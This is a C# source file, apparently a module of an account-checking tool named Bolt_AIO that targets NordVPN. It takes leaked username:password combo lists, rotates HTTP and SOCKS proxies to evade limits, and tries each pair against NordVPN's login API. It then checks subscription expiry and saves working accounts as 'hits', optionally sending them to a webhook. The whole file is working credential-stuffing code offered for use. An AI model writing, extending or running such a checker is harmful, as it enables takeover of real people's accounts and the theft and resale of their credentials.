using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using BoltCUI;
using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace Bolt_AIO
{
    internal class NordVPNmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent = "NordApp android (playstore/2.8.6) Android 9.0.0";
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = false;
                            req.SslCertificateValidatorCallback += (obj, cert, ssl, error) =>
                                (cert as X509Certificate2).Verify();
                            var input = req.Post("https://api.nordvpn.com/v1/users/tokens",
                                "{\"username\":\"" + array[0] + "\",\"password\":\"" + array[1] + "\"}",
                                "application/json").ToString();
                            if (input.Contains("user_id\":"))
                            {
                                var str1 = Base64Encode("token:" +
                                                        Regex.Match(input, "token\":\"(.*?)\"").Groups[1].Value);
                                req.Authorization = "Basic " + str1;
                                var str2 = req.Get("https://zwyr157wwiu6eior.com/v1/users/services").ToString();
                                var str3 = "Expiration Date: ";
                                if (str2.Contains("expires_at"))
                                    foreach (var jtoken in (JArray) JsonConvert.DeserializeObject(str2))
                                        if ((string) jtoken["service"]["name"] == "VPN")
                                        {
                                            if (DateTime.UtcNow < DateTime.ParseExact(
                                                jtoken["expires_at"].ToString().Split(' ')[0], "yyyy-MM-dd",
                                                CultureInfo.InvariantCulture))
                                                str3 = "Expiration Date: " +
                                                       jtoken["expires_at"].ToString().Split(' ')[0];
                                            else
                                                str3 = "Expired";
                                        }

                                if (str3 != "Expired")
                                {
                                    Program.Hits++;
                                    Program.TotalChecks++;
                                    if (Program.lorc == "LOG")
                                        Settings.PrintHit("Nordvpn", array[0] + ":" + array[1] + " | " + str3);
                                    Export.AsResult("/Nordvpn_hits", array[0] + ":" + array[1] + " | " + str3);
                                    if (Settings.sendToWebhook)
                                        Settings.sendTowebhook1(array[0] + ":" + array[1] + " | " + str3, "Nordvpn");
                                }

                                Program.Frees++;
                                Program.TotalChecks++;
                                Export.AsResult("/Nordvpn_frees", array[0] + ":" + array[1]);
                                if (Program.lorc == "LOG") Settings.PrintFree("Nordvpn", array[0] + ":" + array[1]);
                                if (Settings.sendToWebhook)
                                    Settings.sendTowebhook1(array[0] + ":" + array[1], "Nordvpn Free");
                            }

                            if (input.Contains("code\":101301"))
                            {
                                if (input.Contains("message\":\"Unauthorized"))
                                    Program.Fails++;
                                Program.TotalChecks++;
                            }
                            else
                            {
                                Program.Combos.Add(text);
                                req.Dispose();
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}